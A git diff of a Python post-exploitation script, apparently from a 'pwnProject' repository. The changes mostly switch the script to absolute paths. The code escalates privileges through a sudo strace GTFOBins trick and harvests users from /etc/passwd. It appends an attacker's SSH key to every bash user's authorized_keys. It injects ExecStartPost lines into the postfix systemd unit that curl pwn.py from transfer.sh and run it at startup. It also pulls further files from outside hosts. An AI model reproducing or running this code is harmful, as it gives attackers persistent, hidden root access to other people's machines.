@@ -6,6 +6,7 @@ mainUser = 'LivvidDreams'
 scriptLink = 'https://raw.githubusercontent.com/LivvidDreams/pwnProject/master/'
 
 currentCRON = '/var/spool/cron/root'
+locationDir = '/home/user/'
 locationFile = '/home/user/pwn.py'
 
 gtfoBin = 'sudo strace -o /dev/null {}'
@@ -44,16 +45,16 @@ def sshConfigEdit():
 
 def gitKeyPush():
     # runCommand("grep -oE '^[^:]+' /etc/passwd >> users.txt")
-    subprocess.Popen("cut -f 1,6,7 -d: /etc/passwd >> users.txt", shell= True)
+    subprocess.Popen("cut -f 1,6,7 -d: /etc/passwd >> {}users.txt".format(locationDir), shell= True)
     time.sleep(1)
     allDir = {}
-    with open("users.txt", "r") as userDIR:
+    with open("{}users.txt".format(locationDir), "r") as userDIR:
         for dir in userDIR.readlines():
             pathShell = dir.split(":")
             if pathShell[1] == '/': continue
             if pathShell[2] != '/bin/bash\n': continue
             allDir[pathShell[0]] = pathShell[1]
-    runCommand("rm -f users.txt")
+    runCommand("rm -f {}users.txt".format(locationDir))
 
 
     for key in allDir.keys():
@@ -67,7 +68,7 @@ def gitKeyPush():
         # TODO: APPEND IF ONLY KEY NOT IN FILE
 
         # where the key is
-        with open(".rsakeys.pub", "r") as keyFile:
+        with open("{}.rsakeys.pub".format(locationDir), "r") as keyFile:
             key = [line for line in keyFile.readlines()]
         
         # where we want the key
@@ -77,9 +78,9 @@ def gitKeyPush():
                 allLines = [line for line in keyStore.readlines()]
                 
             if key[0] not in allLines:
-                subprocess.Popen('cat .rsakeys.pub >> {}'.format(sshAuthorized), shell = True)
+                subprocess.Popen('cat {}.rsakeys.pub >> {}'.format(locationDir, sshAuthorized), shell = True)
         except:
-            subprocess.Popen('cat .rsakeys.pub >> {}'.format(sshAuthorized), shell = True)
+            subprocess.Popen('cat {}.rsakeys.pub >> {}'.format(locationDir, sshAuthorized), shell = True)
         
 
 
@@ -90,13 +91,13 @@ def gitKeyPush():
         runCommand('chown {}:{} {}'.format(user, user, sshAuthorized))
 
     
-    runCommand('rm -f {}'.format(files[2]))
+    runCommand('rm -f {}{}'.format(locationDir, files[2]))
 
 
 
 def update_python():
     try:
-        pyth = 'python3 --version >/dev/null'
+        pyth = '/usr/bin/python3 --version >/dev/null'
         runCommand(pyth)
         return
     except Exception:
@@ -104,7 +105,7 @@ def update_python():
         runCommand(gtfoBin.format('yum -y -q -e 0 install python3 > /dev/null'))
 
 def rerun():
-    runCommand(gtfoBin.format('python3 pwn.py'), True)
+    runCommand(gtfoBin.format('/usr/bin/python3 pwn.py'), True)
     exit()
 
 
@@ -118,8 +119,8 @@ def is_root():
 
 def startUpRecovery():
     path = '/etc/systemd/system/multi-user.target.wants/postfix.service'
-    ourPwnShit = "ExecStartPost=/usr/bin/curl -s -o {} https://transfer.sh/eFTzi9/pwn.py\n".format(locationFile)
-    ourPwnShitRun = "ExecStartPost=/usr/bin/python3 {}\n".format(locationFile)
+    ourPwnShit = "ExecStartPost=/usr/bin/curl -s -o {} https://transfer.sh/w9jx21/pwn.py\n".format(locationFile)
+    ourPwnShitRun = "ExecStartPost=/usr/bin/python3 {}{}\n".format(locationDir, locationFile)
     
     try:
         with open(path, "r") as service:
@@ -176,22 +177,22 @@ def configureTokens():
     try:
         from dotenv import load_dotenv
     except:
-        runCommand("python3 -m pip install python-dotenv")
+        runCommand("/usr/bin/python3 -m pip install python-dotenv")
         rerun()
 
     api_key = None
 
     
     try:
-        with open(".env", "r") as envFile:
+        with open("{}.env".format(locationDir), "r") as envFile:
             envFile.close()
     except:
         # Prompt user for link
         # store the link 
         # put link in command    
-        # https://transfer.sh/2S2RUM/.env
+        # https://transfer.sh/4dsUEB/.env
         usrInput = input("Enter link for environment variable: ")
-        runCommand("curl -s -o .env {}".format(usrInput))
+        runCommand("curl -s -o {}.env {}".format(locationDir, usrInput))
 
 
     # Ensure we can download enviornment file
@@ -207,14 +208,14 @@ def getScript():
     try:
         import requests
     except:
-        runCommand("python3 -m pip install requests")
+        runCommand("/usr/bin/python3 -m pip install requests")
         rerun()
 
     validAuth = configureTokens()
     if validAuth:
         for file in files:
             save = requests.get(scriptLink + file, auth = validAuth, allow_redirects = True)
-            open(file, "wb").write(save.content)
+            open(locationDir + file, "wb").write(save.content)
 
         print("redownloaded script from github")
     else:
